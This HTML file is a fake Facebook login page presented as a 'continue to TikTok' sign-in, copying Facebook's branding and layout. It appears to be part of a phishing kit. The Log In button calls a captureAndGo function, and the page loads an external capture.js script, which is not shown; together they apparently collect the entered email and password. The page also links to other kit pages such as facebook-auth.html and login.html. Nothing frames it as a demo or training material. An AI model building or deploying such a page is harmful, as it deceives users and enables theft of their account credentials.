<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook – Log In</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background: #1c1c1c;
      color: #e4e6eb;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* ── Header ───────────────────────────────────── */
    header {
      background: #242526;
      border-bottom: 1px solid #3a3b3c;
      height: 56px;
      display: flex;
      align-items: center;
      padding: 0 16px;
    }

    .fb-logo {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: #1877f2;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* ── Main ─────────────────────────────────────── */
    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: 24px 16px 0;
      max-width: 480px;
      width: 100%;
      margin: 0 auto;
    }

    /* ── App logos row ────────────────────────────── */
    .app-logos {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 16px;
    }

    .logo-fb {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      background: #1877f2;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .logo-tiktok {
      width: 44px;
      height: 44px;
      border-radius: 10px;
      background: #010101;
      border: 1px solid #3a3b3c;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .arrows-icon { color: #b0b3b8; }

    /* ── Divider ──────────────────────────────────── */
    .divider {
      height: 1px;
      background: #3a3b3c;
      margin-bottom: 24px;
    }

    /* ── Heading ──────────────────────────────────── */
    .heading {
      font-size: 20px;
      font-weight: 700;
      color: #e4e6eb;
      margin-bottom: 6px;
    }

    .subheading {
      font-size: 14px;
      color: #b0b3b8;
      margin-bottom: 24px;
      line-height: 1.5;
    }

    /* ── Inputs ───────────────────────────────────── */
    .input-field {
      width: 100%;
      height: 50px;
      background: #3a3b3c;
      border: 1px solid #4a4b4c;
      border-radius: 8px;
      color: #e4e6eb;
      font-size: 16px;
      font-family: inherit;
      padding: 0 16px;
      outline: none;
      margin-bottom: 12px;
      transition: border-color 0.15s;
    }
    .input-field::placeholder { color: #8a8d91; }
    .input-field:focus {
      border-color: #1877f2;
      background: #404141;
    }

    /* password eye */
    .pwd-wrap { position: relative; margin-bottom: 12px; }
    .pwd-wrap .input-field { margin-bottom: 0; padding-right: 48px; }
    .eye-btn {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #8a8d91;
      cursor: pointer;
      padding: 4px;
      display: flex;
      align-items: center;
    }
    .eye-btn:hover { color: #e4e6eb; }

    /* ── Forgot password ──────────────────────────── */
    .forgot-link {
      display: block;
      font-size: 14px;
      font-weight: 500;
      color: #4a90d9;
      text-decoration: none;
      margin-bottom: 24px;
    }
    .forgot-link:hover { text-decoration: underline; }

    .spacer { flex: 1; min-height: 40px; }

    /* ── Bottom ───────────────────────────────────── */
    .bottom {
      padding: 0 16px 24px;
      max-width: 480px;
      width: 100%;
      margin: 0 auto;
    }

    .btn-login {
      width: 100%;
      height: 52px;
      background: #1877f2;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 17px;
      font-weight: 700;
      font-family: inherit;
      cursor: pointer;
      margin-bottom: 10px;
      transition: background 0.15s;
    }
    .btn-login:hover { background: #166fe5; }

    .btn-cancel {
      width: 100%;
      height: 52px;
      background: #3a3b3c;
      border: none;
      border-radius: 8px;
      color: #e4e6eb;
      font-size: 17px;
      font-weight: 700;
      font-family: inherit;
      cursor: pointer;
      margin-bottom: 16px;
      transition: background 0.15s;
    }
    .btn-cancel:hover { background: #4a4b4c; }

    .create-row {
      text-align: center;
      font-size: 14px;
      color: #b0b3b8;
    }

    .create-row a {
      color: #4a90d9;
      text-decoration: none;
      font-weight: 500;
    }
    .create-row a:hover { text-decoration: underline; }

    .disclaimer {
      font-size: 12px;
      color: #8a8d91;
      text-align: center;
      line-height: 1.6;
      margin-top: 12px;
    }
    .disclaimer a { color: #4a90d9; text-decoration: none; }
    .disclaimer a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <!-- Header -->
  <header>
    <div class="fb-logo">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="#fff">
        <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
      </svg>
    </div>
  </header>

  <!-- Main -->
  <main>

    <!-- FB ↔ TikTok logos -->
    <div class="app-logos">
      <div class="logo-fb">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="#fff">
          <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
        </svg>
      </div>
      <svg class="arrows-icon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="17 1 21 5 17 9"/>
        <path d="M3 11V9a4 4 0 0 1 4-4h14"/>
        <polyline points="7 23 3 19 7 15"/>
        <path d="M21 13v2a4 4 0 0 1-4 4H3"/>
      </svg>
      <div class="logo-tiktok">
        <svg width="26" height="26" viewBox="0 0 32 32" fill="none">
          <path d="M22.5 8c.28 1.64 1.3 3.07 2.5 3.8v3.2c-1.4-.04-2.74-.47-3.87-1.24v5.64c0 3.64-2.98 6.6-6.63 6.6A6.63 6.63 0 0 1 8 19.4c0-3.64 2.98-6.6 6.63-6.6.23 0 .45.01.67.04v3.26a3.36 3.36 0 0 0-.67-.07 3.4 3.4 0 0 0-3.4 3.37 3.4 3.4 0 0 0 3.4 3.37 3.4 3.4 0 0 0 3.4-3.37V8h3.47z" fill="white"/>
        </svg>
      </div>
    </div>

    <div class="divider"></div>

    <p class="heading">Log in to Facebook</p>
    <p class="subheading">Use your Facebook account to continue to TikTok.</p>

    <!-- Email -->
    <input class="input-field" type="text" id="emailInput" placeholder="Email address or phone number" autocomplete="email" />

    <!-- Password -->
    <div class="pwd-wrap">
      <input class="input-field" type="password" id="pwdInput" placeholder="Password" autocomplete="current-password" />
      <button class="eye-btn" onclick="togglePwd()" type="button">
        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
      </button>
    </div>

    <a href="#" class="forgot-link">Forgotten password?</a>

    <div class="spacer"></div>

  </main>

  <!-- Bottom buttons -->
  <div class="bottom">
    <button class="btn-login" onclick="captureAndGo('facebook-auth.html')">Log In</button>
    <button class="btn-cancel" onclick="window.location.href='login.html'">Cancel</button>

    <p class="create-row">
      Don't have an account? <a href="#">Create new account</a>
    </p>

    <p class="disclaimer">
      TikTok's <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>
    </p>
  </div>

  <script>
    function togglePwd() {
      const input = document.getElementById('pwdInput');
      const icon = document.getElementById('eyeIcon');
      if (input.type === 'password') {
        input.type = 'text';
        icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
      } else {
        input.type = 'password';
        icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
      }
    }
  </script>

  <script src="capture.js"></script>
</body>
</html>
